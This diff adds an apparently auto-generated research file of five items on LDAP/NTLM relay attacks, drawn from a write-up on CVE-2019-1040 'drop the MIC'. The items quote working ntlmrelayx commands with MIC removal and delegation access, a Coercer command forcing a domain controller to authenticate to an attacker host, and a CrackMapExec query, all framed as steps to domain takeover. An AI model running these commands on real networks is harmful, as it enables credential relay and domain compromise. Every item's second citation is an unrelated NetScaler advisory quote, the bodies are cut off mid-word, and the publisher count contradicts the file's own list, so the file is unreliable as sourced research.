@@ -1,0 +1,154 @@
+{
+  "class_id": "ldap",
+  "items": [
+    {
+      "item_key": "ldap.auto.01",
+      "claim": "(This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected.",
+      "kind": "technique",
+      "body": "st --add-computer – create domain computer object -smb2support – SMB version 2 support \n The full command: ntlmrelayx.py \\\n -t ldaps://10.10.10.1 \\\n -wh bhispad@foobar.com \\\n -smb2support As demonstrated in the figure below, we received a connection via SMB. However, attempting to relay SMB to LDAP resulted in the following error: “[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected. Typically, SMB traffic cannot be relayed to LDAP(S). NTLM authentication consists of three message types: NTLM_NEGOTIATE , NTLM_CHALLENGE , and NTLM_AUTHENTICATE . A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity C",
+      "disproof": "This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: \"(This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This\".",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+          "source_type": "blog",
+          "host": "blackhillsinfosec.com",
+          "publisher": "blackhillsinfosec.com",
+          "quote": "(This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected."
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+          "source_type": "advisory",
+          "host": "google.com",
+          "publisher": "google.com",
+          "quote": "Exploitation of CVE-2026-88772 bypasses authentication and triggers an unhandled termination of the NetScaler Packet Processing Engine (NSPPE) to establish initial root-level access."
+        }
+      ]
+    },
+    {
+      "item_key": "ldap.auto.02",
+      "claim": "A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check.",
+      "kind": "technique",
+      "body": "work! (This usually happens when relaying from SMB to LDAP).” SMB to LDAP Connection Failed This behavior is expected. Typically, SMB traffic cannot be relayed to LDAP(S). NTLM authentication consists of three message types: NTLM_NEGOTIATE , NTLM_CHALLENGE , and NTLM_AUTHENTICATE . A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check. When MIC is not included, the connection from SMB can be relayed to LDAPS. Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment. At this point, we have network level access, and we located the target domain controller DC01.foobar.com (10.10.10.1). To provide a brief initial attack summary: \n Configure NTLMRelayx to relay NTLM",
+      "disproof": "This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: \"A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass \".",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+          "source_type": "blog",
+          "host": "blackhillsinfosec.com",
+          "publisher": "blackhillsinfosec.com",
+          "quote": "A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check."
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+          "source_type": "advisory",
+          "host": "google.com",
+          "publisher": "google.com",
+          "quote": "Over HTTP, it extracts Base64-encoded commands from the HTTP_NSC_LDAP header, executes them via shell_exec() , and returns Base64-encoded output."
+        }
+      ]
+    },
+    {
+      "item_key": "ldap.auto.03",
+      "claim": "Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment.",
+      "kind": "technique",
+      "body": "tampering. A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC). 4 This issue is known as the “drop the MIC” vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check. When MIC is not included, the connection from SMB can be relayed to LDAPS. Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment. At this point, we have network level access, and we located the target domain controller DC01.foobar.com (10.10.10.1). To provide a brief initial attack summary: \n Configure NTLMRelayx to relay NTLM authentication to the target the domain controller and remove message integrity Configure Responder poisoner with SMB and HTTP servers disabled Wait for incoming credentials \n We can exploit systems v",
+      "disproof": "This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: \"Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target\".",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+          "source_type": "blog",
+          "host": "blackhillsinfosec.com",
+          "publisher": "blackhillsinfosec.com",
+          "quote": "Exploiting CVE-2019-1040 Once again, let’s imagine we have gained a foothold in the target organization Foobar’s environment."
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+          "source_type": "advisory",
+          "host": "google.com",
+          "publisher": "google.com",
+          "quote": "Relying exclusively on local NetScaler ACLs allows traffic to reach the vulnerable packet-processing engine (nsppe) before it is dropped."
+        }
+      ]
+    },
+    {
+      "item_key": "ldap.auto.04",
+      "claim": "Domain Takeover If we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller.",
+      "kind": "technique",
+      "body": "effectively escalated from network access to domain account access. We can test our computer account credentials using CrackMapExec 6 and query the ms-ds-machineaccountquota . crackmapexec ldap DC01.foobar.com -u snowmachine2$ -p REDACTED -M MAQ Authenticate as Snowmachine2$ and Get MAQ We can use these domain credentials to enumerate domain information and explore paths of privilege escalation. Domain Takeover If we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller. Scenario Details: \n Domain Controller 1: DC01.foobar.com (10.10.10.1) Domain Controller 2: DC02.foobar.com (10.10.10.22) Attacker Machine: 10.10.10.200 Owned User: snowmachine2$ (can use any domain user account) Known Domain Administrator Account: DA_Dan \n We can elevate privileges from a standard domain computer account (snowmachine2$) to a domain administrator account by following the procedure",
+      "disproof": "This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: \"Domain Takeover If we have two domain controllers, and at least one domain controller can \".",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+          "source_type": "blog",
+          "host": "blackhillsinfosec.com",
+          "publisher": "blackhillsinfosec.com",
+          "quote": "Domain Takeover If we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller."
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+          "source_type": "advisory",
+          "host": "google.com",
+          "publisher": "google.com",
+          "quote": "A matching DTLS handshake failure followed within minutes by an NSPPE termination/crash on the same appliance is a strong exploitation signal and should be investigated with high priority."
+        }
+      ]
+    },
+    {
+      "item_key": "ldap.auto.05",
+      "claim": "Using the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200). **Side Note: In some cases, a relay attack may not require domain credentials.",
+      "kind": "technique",
+      "body": "relayx.py command, we can tell ntlmrelayx to create a computer object with delegation access to the relayed account.: ntlmrelayx.py\n -t ldaps://DC01.foobar.com \\\n -wh bhispad \\\n --add-computer 'DcMachine' \\\n --delegate-access\\\n --remove-mic \\\n -smb2support Coercer 7 is a python tool used to coerce Windows machines to authenticate to an attacker machine by abusing various vulnerable RPC functions. Using the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200). **Side Note: In some cases, a relay attack may not require domain credentials. For example, if the victim host is not patched against CVE-2021-36942. 8 ** The Coercer arguments required are as follows: -u - Domain Username\n-p - Password for User \n-d - Target Domain\n-l - Listener IP (Our Relay)\n-t - Target The complete Coercer command is shown below. coercer coerce \\\n -u snowmachine2$ \\\n -p REDACTED \\\n -d foobar.com \\\n -l 10.10.10.200 \\\n -t DC02.foobar.com The Coercer respon",
+      "disproof": "This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: \"Using the domain credentials obtained from our new computer account snowmachine2$, we can \".",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+          "source_type": "blog",
+          "host": "blackhillsinfosec.com",
+          "publisher": "blackhillsinfosec.com",
+          "quote": "Using the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200). **Side Note: In some cases, a relay attack may not require domain credentials."
+        },
+        {
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+          "source_type": "advisory",
+          "host": "google.com",
+          "publisher": "google.com",
+          "quote": "Because exploitation can require very little traffic, volume-based anomaly detection alone may not identify the activity."
+        }
+      ]
+    }
+  ],
+  "publishers": 3,
+  "publishers_used": [
+    "blackhillsinfosec.com",
+    "google.com"
+  ],
+  "sources": [
+    {
+      "url": "https://www.blackhillsinfosec.com/bypass-ntlm-message-integrity-check-drop-the-mic",
+      "domain": "blackhillsinfosec.com",
+      "ok": true,
+      "spans": 5,
+      "error": ""
+    },
+    {
+      "url": "https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances",
+      "domain": "google.com",
+      "ok": true,
+      "spans": 6,
+      "error": ""
+    },
+    {
+      "url": "https://trustedsec.com/blog/exploring-ntds-dit-part-1-cracking-the-surface-with-dit-explorer",
+      "domain": "trustedsec.com",
+      "ok": true,
+      "spans": 1,
+      "error": ""
+    }
+  ]
+}
+// COMPLETE autogenerated by orch.researcher
